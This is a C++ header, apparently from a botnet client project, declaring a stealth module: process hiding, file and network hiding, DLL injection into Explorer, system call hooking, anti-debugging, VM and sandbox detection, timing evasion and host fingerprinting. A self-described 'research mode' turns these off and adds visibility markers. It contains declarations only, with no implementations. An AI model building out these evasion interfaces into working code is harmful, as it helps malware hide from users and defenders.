#pragma once

#include <string>
#include <vector>
#include <memory>
#include <atomic>
#include <mutex>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace stealth {

/**
 * @brief Cross-platform stealth manager - single codebase approach
 * 
 * Implements stealth and evasion techniques for Windows, Linux, and macOS.
 * In research mode, most stealth features are DISABLED or clearly marked.
 */
class StealthManager {
public:
    enum class StealthFeature {
        PROCESS_HIDING,         // Hide from process lists
        FILE_HIDING,           // Hide executable files
        NETWORK_HIDING,        // Hide network connections
        ANTI_ANALYSIS,         // Anti-debugging/analysis
        VM_DETECTION,          // Virtual machine detection
        SANDBOX_DETECTION,     // Sandbox environment detection
        TIMING_EVASION,        // Execution timing evasion
        RESEARCH_MARKING       // Research mode identification
    };

    enum class EnvironmentType {
        PHYSICAL_MACHINE,
        VMWARE,
        VIRTUALBOX,
        HYPER_V,
        QEMU,
        DOCKER,
        SANDBOX,
        ANALYSIS_ENVIRONMENT,
        UNKNOWN
    };

    struct StealthStatus {
        bool process_hidden;
        bool files_hidden;
        bool network_hidden;
        bool anti_analysis_active;
        EnvironmentType environment;
        bool research_mode;
        std::string research_identifier;
        std::vector<std::string> active_features;
    };

public:
    StealthManager();
    ~StealthManager();

    // Core stealth operations
    bool EnableStealth(const std::vector<StealthFeature>& features);
    bool DisableStealth();
    bool IsStealthEnabled() const;
    StealthStatus GetStealthStatus() const;
    
    // Individual feature control
    bool EnableFeature(StealthFeature feature);
    bool DisableFeature(StealthFeature feature);
    bool IsFeatureEnabled(StealthFeature feature) const;
    bool IsFeatureSupported(StealthFeature feature) const;
    
    // Process hiding (DISABLED in research mode)
    bool HideProcess();
    bool UnhideProcess();
    bool IsProcessHidden() const;
    
    // File hiding (DISABLED in research mode)
    bool HideExecutable(const std::string& file_path);
    bool UnhideExecutable(const std::string& file_path);
    bool IsFileHidden(const std::string& file_path) const;
    
    // Network hiding (DISABLED in research mode)
    bool HideNetworkConnections();
    bool UnhideNetworkConnections();
    bool AreNetworkConnectionsHidden() const;
    
    // Anti-analysis (DISABLED in research mode)
    bool EnableAntiDebugging();
    bool DisableAntiDebugging();
    bool IsAntiDebuggingEnabled() const;
    
    bool EnableAntiVM();
    bool DisableAntiVM();
    bool IsAntiVMEnabled() const;
    
    // Environment detection (ALWAYS enabled for research data)
    EnvironmentType DetectEnvironment() const;
    bool IsRunningInVM() const;
    bool IsRunningInSandbox() const;
    bool IsRunningInAnalysisEnvironment() const;
    
    // Research mode (ALWAYS enabled in our use case)
    void EnableResearchMode(const std::string& research_id);
    void DisableResearchMode();
    bool IsResearchModeEnabled() const;
    void AddResearchMarkers();
    
    // Timing evasion
    void AddExecutionDelay(std::chrono::milliseconds min_delay = std::chrono::milliseconds(100),
                          std::chrono::milliseconds max_delay = std::chrono::milliseconds(1000));
    void SleepRandomInterval(std::chrono::seconds base_interval) const;

private:
    std::atomic<bool> stealth_enabled_;
    std::atomic<bool> research_mode_;
    std::string research_identifier_;
    std::map<StealthFeature, bool> enabled_features_;
    mutable std::mutex features_mutex_;
    
    // Cross-platform stealth implementations
    bool HideProcessWindows();
    bool HideProcessLinux();
    bool HideProcessMacOS();
    
    bool HideFileWindows(const std::string& file_path);
    bool HideFileLinux(const std::string& file_path);
    bool HideFileMacOS(const std::string& file_path);
    
    bool HideNetworkWindows();
    bool HideNetworkLinux();
    bool HideNetworkMacOS();
    
    // Anti-analysis implementations
    bool EnableAntiDebuggingWindows();
    bool EnableAntiDebuggingLinux();
    bool EnableAntiDebuggingMacOS();
    
    // Environment detection implementations
    EnvironmentType DetectVMWareEnvironment() const;
    EnvironmentType DetectVirtualBoxEnvironment() const;
    EnvironmentType DetectHyperVEnvironment() const;
    EnvironmentType DetectQEMUEnvironment() const;
    EnvironmentType DetectDockerEnvironment() const;
    EnvironmentType DetectSandboxEnvironment() const;
    
    // Research mode implementations
    void AddWindowsResearchMarkers();
    void AddLinuxResearchMarkers();
    void AddMacOSResearchMarkers();
    
    // Utility methods
    bool CheckAdministratorPrivileges() const;
    std::vector<StealthFeature> GetSupportedFeatures() const;
    void LogStealthActivity(const std::string& activity);
};

/**
 * @brief Process hiding implementations (DISABLED in research mode)
 */
class ProcessHiding {
public:
    // Windows process hiding
    static bool HideFromTaskManagerWindows();
    static bool HideFromWMIWindows();
    static bool InjectIntoExplorerWindows();
    
    // Linux process hiding
    static bool HideFromProcFSLinux();
    static bool HideFromPSLinux();
    static bool ModifyProcStatLinux();
    
    // macOS process hiding
    static bool HideFromActivityMonitorMacOS();
    static bool HideFromPSMacOS();
    
    // Research mode process identification
    static bool MarkProcessAsResearch(const std::string& research_id);
    static bool AddResearchProcessMarkers();

private:
    static bool ModifyProcessMemory(uint32_t process_id, const std::vector<uint8_t>& patch);
    static bool InjectDLL(uint32_t process_id, const std::string& dll_path);
    static bool HookSystemCall(const std::string& function_name);
};

/**
 * @brief Anti-analysis implementations (DISABLED in research mode)
 */
class AntiAnalysis {
public:
    // Anti-debugging
    static bool IsDebuggerPresent();
    static bool IsRemoteDebuggerPresent();
    static bool DetectBreakpoints();
    static bool DetectSingleStepping();
    
    // Anti-VM detection
    static bool DetectVMWareArtifacts();
    static bool DetectVirtualBoxArtifacts();
    static bool DetectHyperVArtifacts();
    static bool DetectQEMUArtifacts();
    
    // Anti-sandbox detection
    static bool DetectSandboxEnvironment();
    static bool DetectAnalysisTools();
    static bool DetectAutomatedAnalysis();
    
    // Timing attacks
    static bool DetectEmulation();
    static bool DetectInstrumentation();
    
    // Research mode - DISABLE all anti-analysis
    static void DisableAllAntiAnalysis();
    static void EnableAnalysisFriendlyMode();

private:
    // Windows-specific anti-analysis
    static bool CheckWindowsDebuggerFlags();
    static bool CheckWindowsVMRegistry();
    static bool CheckWindowsDrivers();
    
    // Linux-specific anti-analysis
    static bool CheckLinuxPtrace();
    static bool CheckLinuxVMFiles();
    static bool CheckLinuxKernelModules();
    
    // macOS-specific anti-analysis
    static bool CheckMacOSDebugger();
    static bool CheckMacOSVMSignatures();
    static bool CheckMacOSSystemProfiler();
    
    // Cross-platform timing checks
    static std::chrono::microseconds MeasureInstructionTiming();
    static bool DetectSlowExecution();
};

/**
 * @brief Environment fingerprinting for research data collection
 */
class EnvironmentFingerprinting {
public:
    struct EnvironmentInfo {
        std::string os_name;
        std::string os_version;
        std::string architecture;
        std::string cpu_model;
        uint32_t cpu_cores;
        uint64_t total_memory;
        std::string hostname;
        std::string domain;
        std::vector<std::string> network_interfaces;
        std::vector<std::string> installed_software;
        bool is_virtual_machine;
        bool is_sandbox;
        std::string vm_type;
        std::string analysis_environment;
    };

public:
    static EnvironmentInfo GatherEnvironmentInfo();
    static std::string GenerateEnvironmentFingerprint();
    
    // Research mode - ALWAYS collect environment data
    static EnvironmentInfo GatherResearchEnvironmentInfo();
    static void LogEnvironmentForResearch(const std::string& research_session);

private:
    static EnvironmentInfo GatherWindowsEnvironmentInfo();
    static EnvironmentInfo GatherLinuxEnvironmentInfo();
    static EnvironmentInfo GatherMacOSEnvironmentInfo();
    
    static std::vector<std::string> GetInstalledSoftware();
    static std::vector<std::string> GetNetworkAdapters();
    static std::string DetectVirtualization();
    static std::string DetectAnalysisEnvironment();
};

/**
 * @brief Timing and execution evasion
 */
class TimingEvasion {
public:
    // Execution timing
    static void AddRandomDelay(std::chrono::milliseconds min_delay,
                              std::chrono::milliseconds max_delay);
    static void SleepWithJitter(std::chrono::seconds base_duration);
    
    // Human-like behavior simulation
    static void SimulateUserActivity();
    static void WaitForUserInactivity();
    static void MimicHumanTiming();
    
    // Research mode timing
    static void UseResearchTiming();
    static void EnablePredictableTiming();

private:
    static bool IsUserActive();
    static std::chrono::milliseconds GetRandomJitter();
    static void SimulateKeyboardActivity();
    static void SimulateMouseActivity();
};

/**
 * @brief Research mode stealth manager
 */
class ResearchStealth {
public:
    static void EnableResearchMode(const std::string& research_id,
                                  const std::string& session_id);
    static void DisableAllStealthFeatures();
    static void AddVisibilityMarkers();
    static void EnableAnalysisFriendlyFeatures();
    
    // Research identification
    static void SetProcessTitle(const std::string& research_title);
    static void CreateResearchMarkerFiles();
    static void AddResearchEnvironmentVariables();
    
    // Logging for research
    static void LogStealthAttempts(const std::string& attempt_type);
    static void LogEnvironmentDetection(const std::string& environment);
    static std::vector<std::string> GetStealthActivityLog();

private:
    static std::string research_id_;
    static std::string session_id_;
    static std::vector<std::string> activity_log_;
    static std::mutex log_mutex_;
    
    static void LogActivity(const std::string& activity);
    static std::string GetResearchMarkerPath();
    static std::string GenerateResearchMarkerContent();
};

/**
 * @brief Stealth feature validator and safety checker
 */
class StealthValidator {
public:
    struct ValidationResult {
        bool is_safe_for_research;
        std::vector<std::string> blocked_features;
        std::vector<std::string> warnings;
        std::vector<std::string> recommendations;
    };

public:
    static ValidationResult ValidateStealthConfiguration(
        const std::vector<StealthFeature>& features,
        bool research_mode);
    
    static bool IsSafeForResearch(StealthFeature feature);
    static std::vector<StealthFeature> GetResearchSafeFeatures();
    static std::vector<StealthFeature> GetBlockedFeatures();
    
    // Safety checks
    static bool CheckEthicalCompliance(const std::vector<StealthFeature>& features);
    static bool ValidateResearchConstraints(const std::string& research_id);

private:
    static const std::vector<StealthFeature> RESEARCH_SAFE_FEATURES;
    static const std::vector<StealthFeature> BLOCKED_FEATURES;
    
    static bool IsFeatureSafeForResearch(StealthFeature feature);
    static std::string GetFeatureRiskLevel(StealthFeature feature);
};

} // namespace stealth
} // namespace client
} // namespace botnet
